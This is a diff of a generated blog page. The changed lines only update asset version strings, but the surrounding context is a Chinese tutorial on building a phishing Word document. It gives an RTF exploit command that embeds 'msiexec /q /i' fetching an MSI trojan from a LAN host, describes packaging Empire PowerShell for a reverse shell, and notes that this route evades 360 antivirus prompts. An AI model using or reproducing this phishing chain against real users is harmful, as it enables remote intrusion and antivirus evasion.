@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1567212669585">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1569228481287">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -36,7 +36,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1567212669585" class="site-logo">
+        <img src="https://mari0er.github.io/images/avatar.png?v=1569228481287" class="site-logo">
         <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -126,7 +126,7 @@ C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;msiexec /q /i http://192.168.10.
 <p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，具体的配置内容可以参考<a href="https://mari0er.club/post/empire.html">这篇文章</a>,之后将生成的powershell代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用第二步的方法制作成msi文件，最后利用RTF脚本生成doc文件。此时打开Word文档就会远程执行下载和安装msi木马的命令，进一步运行powershell进行反弹。</p>
 <pre><code>python RTF_11882_0802.py -c &quot;msiexec /q /i http://192.168.10.18/calc.msi&quot; -o test.doc -i test.rtf
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0202_empire.png" alt="empire"></p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0202_empire.png" alt="empire"></figure>
 <h2 id="0x04">0x04</h2>
 <p>  看到这里有人可能要问：为什么非要先调用msi文件再间接调用powershell呢？直接把执行命令通过RTF脚本写到文档里不是更方便吗？这里说一下，经过我的测试发现，直接利用RTF脚本运行命令，在360存在的情况下一定会弹窗，但通过msi安装文件却不会，其次RTF脚本  <strong>-c</strong>  参数有109字节数限制。其实还有很多其他的利用方法，比如利用msiexec直接下载并运行msfvenom制作的msi木马文件，可以直接获得meterpreter会话。但是，需要提前对msi木马文件进行免杀处理。<br>
 <img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0203_gif.gif" alt=""></p>
